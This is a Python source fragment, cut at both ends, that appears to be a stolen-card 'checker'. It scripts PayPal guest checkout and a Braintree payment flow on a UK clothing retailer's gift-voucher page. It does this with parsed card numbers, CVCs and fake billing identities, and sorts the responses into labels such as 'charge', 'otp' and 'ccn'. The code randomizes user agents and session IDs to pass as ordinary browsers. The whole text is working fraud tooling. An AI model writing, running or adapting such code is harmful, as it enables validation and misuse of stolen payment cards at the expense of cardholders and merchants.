pZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&intent=capture&locale.country=US&locale.lang=en&hasShippingCallback=false&platform=mobile&renderedButtons.0=paypal&renderedButtons.1=card&sessionID=uid_34f814f66d_mtg6mdg6ntc&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFMN0FyTVpCaEVkOGhJalNNODVYelZ1OTRRaDdCZDZUbzFoeDZoM3FPbTZzX05WLXdvaTMyaWMzdXYyUGlydkZ0ZHNiZWhGbHhPRUk0aF8mZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9SEtEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&sdkVersion=5.0.515&storageID=uid_98779f6fde_mjm6ntk6mtu&buttonColor.shouldApplyRebrandedStyles=false&buttonColor.color=gold&buttonColor.isButtonColorABTestMerchant=false&supportedNativeBrowser=true&supportsPopups=true&sdkSource=button-factory&vault=false&userAgent=Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
    cookies=r.cookies,
    headers=headers,
)
	au = re.search(r'facilitatorAccessToken":"(.*?)"', response.text).group(1)
	headers = {
    'authority': 'www.paypal.com',
    'accept': 'application/json',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {au}',
    'content-type': 'application/json',
    'origin': 'https://www.paypal.com',
    'paypal-partner-attribution-id': '',
    'prefer': 'return=representation',
    'referer': 'https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&style.shouldApplyRebrandedStyles=false&style.isButtonColorABTestMerchant=false&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_b4c40bd540_mtc6mzk6ntm&buttonSize=large&customerId=&clientID=AQL7ArMZBhEd8hIjSM85XzVu94Qh7Bd6To1hx6h3qOm6s_NV-woi32ic3uv2PirvFtdsbehFlxOEI4h_&clientMetadataID=uid_963d2a2bbb_mtc6mzk6mzg&commit=true&components.0=buttons&currency=HKD&debug=false&disableSetCookie=true&eagerOrderCreation=false&enableFunding.0=venmo&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.spbEagerOrderCreation=false&experiment.venmoWebEnabled=false&experiment.isWebViewEnabled=false&experiment.isPaypalRebrandEnabled=false&experiment.isPaypalRebrandABTestEnabled=false&experiment.defaultBlueButtonColor=defaultBlue_lightBlue&experiment.venmoEnableWebOnNonNativeBrowser=false&experiment.paypalCreditButtonCreateVaultSetupTokenExists=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJlbG8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJqY2IiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJtYWVzdHJvIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaW5lcnMiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImN1cCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiY2JfbmF0aW9uYWxlIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&intent=capture&locale.lang=en&locale.country=US&hasShippingCallback=false&platform=mobile&renderedButtons.0=paypal&renderedButtons.1=card&sessionID=uid_963d2a2bbb_mtc6mzk6mzg&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFMN0FyTVpCaEVkOGhJalNNODVYelZ1OTRRaDdCZDZUbzFoeDZoM3FPbTZzX05WLXdvaTMyaWMzdXYyUGlydkZ0ZHNiZWhGbHhPRUk0aF8mZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9SEtEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&sdkVersion=5.0.515&storageID=uid_98779f6fde_mjm6ntk6mtu&buttonColor.shouldApplyRebrandedStyles=false&buttonColor.color=gold&buttonColor.isButtonColorABTestMerchant=false&supportedNativeBrowser=true&supportsPopups=true&sdkSource=button-factory&vault=false&userAgent=Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'purchase_units': [
        {
            'amount': {
                'value': '1',
                'currency_code': 'HKD',
            },
            'description': 'mjgvvhv',
        },
    ],
    'intent': 'CAPTURE',
    'application_context': {},
}

	response = r.post('https://www.paypal.com/v2/checkout/orders', cookies=r.cookies, headers=headers, json=json_data)
	
	lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
	
	lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
	
	lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
	
	
	
	random_chars_button = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
	
	
	session_id = f'uid_{lol1}_{lol3}'
	
	
	button_session_id = f'uid_{lol2}_{lol3}'
	
	tok = (response.json()['id'])
	
	headers = {
    'authority': 'www.paypal.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'referer': 'https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&style.shouldApplyRebrandedStyles=false&style.isButtonColorABTestMerchant=false&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_b4c40bd540_mtc6mzk6ntm&buttonSize=large&customerId=&clientID=AQL7ArMZBhEd8hIjSM85XzVu94Qh7Bd6To1hx6h3qOm6s_NV-woi32ic3uv2PirvFtdsbehFlxOEI4h_&clientMetadataID=uid_963d2a2bbb_mtc6mzk6mzg&commit=true&components.0=buttons&currency=HKD&debug=false&disableSetCookie=true&eagerOrderCreation=false&enableFunding.0=venmo&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.spbEagerOrderCreation=false&experiment.venmoWebEnabled=false&experiment.isWebViewEnabled=false&experiment.isPaypalRebrandEnabled=false&experiment.isPaypalRebrandABTestEnabled=false&experiment.defaultBlueButtonColor=defaultBlue_lightBlue&experiment.venmoEnableWebOnNonNativeBrowser=false&experiment.paypalCreditButtonCreateVaultSetupTokenExists=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJlbG8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJqY2IiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJtYWVzdHJvIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaW5lcnMiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImN1cCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiY2JfbmF0aW9uYWxlIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&intent=capture&locale.lang=en&locale.country=US&hasShippingCallback=false&platform=mobile&renderedButtons.0=paypal&renderedButtons.1=card&sessionID=uid_963d2a2bbb_mtc6mzk6mzg&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFMN0FyTVpCaEVkOGhJalNNODVYelZ1OTRRaDdCZDZUbzFoeDZoM3FPbTZzX05WLXdvaTMyaWMzdXYyUGlydkZ0ZHNiZWhGbHhPRUk0aF8mZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9SEtEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&sdkVersion=5.0.515&storageID=uid_98779f6fde_mjm6ntk6mtu&buttonColor.shouldApplyRebrandedStyles=false&buttonColor.color=gold&buttonColor.isButtonColorABTestMerchant=false&supportedNativeBrowser=true&supportsPopups=true&sdkSource=button-factory&vault=false&userAgent=Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

	params = {
    'token': tok,
    'sessionID': session_id,
    'buttonSessionID': button_session_id,
    'locale.x': 'en_US',
    'commit': 'true',
    'style.submitButton.display': 'true',
    'hasShippingCallback': 'false',
    'env': 'production',
    'country.x': 'US',
    'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFMN0FyTVpCaEVkOGhJalNNODVYelZ1OTRRaDdCZDZUbzFoeDZoM3FPbTZzX05WLXdvaTMyaWMzdXYyUGlydkZ0ZHNiZWhGbHhPRUk0aF8mZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9SEtEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0',
    'disable-card': '',
}

	response = r.get('https://www.paypal.com/smart/card-fields', params=params, cookies=r.cookies, headers=headers)
#	print(response.json())
	headers = {
    'authority': 'www.paypal.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://www.paypal.com',
    'paypal-client-context': tok,
    'paypal-client-metadata-id': '1GC71492RA473922G',
    'referer': 'https://www.paypal.com/smart/card-fields?token=1GC71492RA473922G&sessionID=uid_963d2a2bbb_mtc6mzk6mzg&buttonSessionID=uid_65fc64845a_mtc6ndq6mjy&locale.x=en_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFMN0FyTVpCaEVkOGhJalNNODVYelZ1OTRRaDdCZDZUbzFoeDZoM3FPbTZzX05WLXdvaTMyaWMzdXYyUGlydkZ0ZHNiZWhGbHhPRUk0aF8mZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9SEtEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&disable-card=',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-app-name': 'standardcardfields',
    'x-country': 'US',
}

	json_data = {
    'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
    'variables': {
        'token': tok,
        'card': {
            'cardNumber': n,
            'type': 'VISA',
            'expirationDate': mm+'/20'+yy,
            'postalCode': '90001',
            'securityCode': cvc,
        },
        'phoneNumber': '4052525555',
        'firstName': 'Mary',
        'lastName': 'Frank',
        'billingAddress': {
            'givenName': first_name,
            'familyName': last_name,
            'line1': '1535 Broadway',
            'line2': None,
            'city': 'New York',
            'state': 'CA',
            'postalCode': '90001',
            'country': 'US',
        },
        'shippingAddress': {
            'givenName': first_name,
            'familyName': last_name,
            'line1': '1535 Broadway',
            'line2': None,
            'city': 'New York',
            'state': 'CA',
            'postalCode': '90001',
            'country': 'US',
        },
        'email': acc,
        'currencyConversionType': 'PAYPAL',
    },
    'operationName': None,
}

	response = r.post(
    f'https://www.paypal.com/graphql?fetch_credit_form_submit',
    cookies=r.cookies,
    headers=headers,
    json=json_data,
)
	last = response.text
	if 'ADD_SHIPPING_ERROR' in last or '"status": "succeeded"' in last or 'Thank You For Donation.' in last or 'Your payment has already been processed' in last or 'Success ' in last:
		return 'charge'
	
	
	elif 'is3DSecureRequired' in last or 'OTP' in last:
		return 'otp'
		
	elif 'INVALID_SECURITY_CODE' in last:
		return 'ccn'
		
		
	elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
		return 'approved'
		
	elif 'INVALID_BILLING_ADDRESS' in last:
		return 'INVALID_BILLING_ADDRESS'
		
	else:
		return response.json()["errors"][0]["message"]
	time.sleep(20)




def brintree10(ccx):
	card = ccx.strip()
	parts = re.split('[:|/]', card)
	c = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	user = user_agent.generate_user_agent()
	r=requests.Session()
	headers = {
	    'authority': 'www.tonicsmenswear.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://www.tonicsmenswear.co.uk/', headers=headers)
	
	#cart get 
	
	
	headers = {
	    'authority': 'www.tonicsmenswear.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.tonicsmenswear.co.uk',
	    'referer': 'https://www.tonicsmenswear.co.uk/gift/voucher-10',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	data = {
	    'sender_name': '',
	    'friend_name': '',
	    'friend_message': '',
	    'friend_email': '',
	    'pid': 'gft',
	    'pnum': '1',
	    'bid': '1',
	    'title': '10 Gift Voucher',
	    'price': '10.00',
	    'uri_slug': 'voucher-10',
	    'size': 'e-voucher',
	    'email_to_friend_mode': '',
	}
	
	response = r.post(
	    'https://www.tonicsmenswear.co.uk/_include/shop/cart_logic.php',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	
	
	#checkout
	
	headers = {
	    'authority': 'www.tonicsmenswear.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'referer': 'https://www.tonicsmenswear.co.uk/gift/voucher-10',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://www.tonicsmenswear.co.uk/checkout/', cookies=r.cookies, headers=headers)
	a = re.search(r"clientToken\s*=\s*'([^']+)'", response.text)
	auth=base64.b64decode(a.group(1)).decode().split('print":"')[1].split('"')[0]
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {auth}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'dropin2',
	        'sessionId': 'd8b091ad-25dc-437b-a9cc-840cf9700b13',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': c,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'cardholderName': 'r. marten',
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	
	tokennsbrint=response.json()['data']['tokenizeCreditCard']['token']
	
	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://www.tonicsmenswear.co.uk',
	    'referer': 'https://www.tonicsmenswear.co.uk/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'amount': '10',
	    'additionalInfo': {
	        'workPhoneNumber': '',
	        'shippingGivenName': 'Raph',
	        'shippingSurname': 'Alfa',
	        'shippingPhone': '02143269785',
	        'acsWindowSize': '03',
	        'billingLine1': 'London 1000',
	        'billingLine2': '',
	        'billingCity': 'London',
	        'billingState': '',
	        'billingPostalCode': 'EX8 1AQ',
	        'billingCountryCode': 'GB',
	        'billingPhoneNumber': '02143269785',
	        'billingGivenName': 'Raph',
	        'billingSurname': 'Raph',
	        'shippingLine1': 'London 1000',
	        'shippingLine2': '',
	        'shippingCity': 'London',
	        'shippingState': '',
	        'shippingPostalCode': 'EX8 1AQ',
	        'shippingCountryCode': 'GB',
	        'email': 'raph@rhp.com',
	    },
	    'bin': c[0:6],
	    'dfReferenceId': '1_009cba41-8cbc-4260-a436-22ab9c0557a1',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.78.2',
	        'cardinalDeviceDataCollectionTimeElapsed': 220,
	        'issuerDeviceDataCollectionTimeElapsed': 9232,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': auth,
	    'braintreeLibraryVersion': 'braintree/web/3.78.2',
	    '_meta': {
	        'merchantAppId': 'www.tonicsmenswear.co.uk',
	        'platform': 'web',
	        'sdkVersion': '3.78.2',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': 'c91feb47-5823-4174-9058-f8d5a72f922f',
	    },
	}
	
	response = r.post(
